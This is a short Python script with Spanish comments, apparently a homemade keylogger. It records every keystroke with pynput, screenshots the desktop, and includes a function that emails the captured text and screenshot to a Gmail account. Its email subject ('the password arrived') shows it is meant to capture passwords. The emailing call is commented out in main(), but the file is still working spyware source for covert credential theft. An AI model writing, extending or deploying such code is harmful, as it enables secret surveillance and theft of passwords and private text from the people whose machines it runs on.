from pynput import keyboard
import smtplib
import os
from email.message import EmailMessage
from enum import Enum
import pyautogui
import imghdr

email = os.environ.get("EMAIL_USER")
passw = os.environ.get("EMAIL_PASS")
palabra = []
text = ""
item = ""


# Collect events until released
def read():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release,
    ) as listener:
        listener.join()


def on_press(key):
    global text
    if isinstance(key, Enum):
        if str(key) == "Key.enter":
            text += "\n"
        elif str(key) == "Key.space":
            text += " "
        else:
           # print(str(key))
            text += " >>" + str(key) + "<< "
    else:
     #   print(key)
        text += key.char


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


def send():
    msg = EmailMessage()
    msg['Subject'] = 'Llegó la clave 7u7'
    msg['From'] = email
    msg['To'] = email
    msg.set_content(f'Se detectó lo siguiente:\n{text}')

    with open("foto.png", "rb") as f:
        file_data = f.read()
        file_type = imghdr.what(f.name)
        file_name = f.name

    msg.add_attachment(file_data, maintype="image", subtype=file_type, filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(email, passw)
        smtp.send_message(msg)


def test():
    print("Al final sale:\n{0}".format(text))


def filter():
    p = "hola"
    in_words = text.split()
    # for word in in_words:
    #     if x in word :
    #         print(in_words.index(word))
    for x in in_words:
        if p == x: print(f'acá estáaaa {in_words.index(x)}')

def take_ss():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'.\foto.png')


def del_ss():
    os.remove("foto.png")


def main():
    read()
    test()
    take_ss()
    #   send(text)
    del_ss()
    filter()


if __name__ == "__main__":
    main()
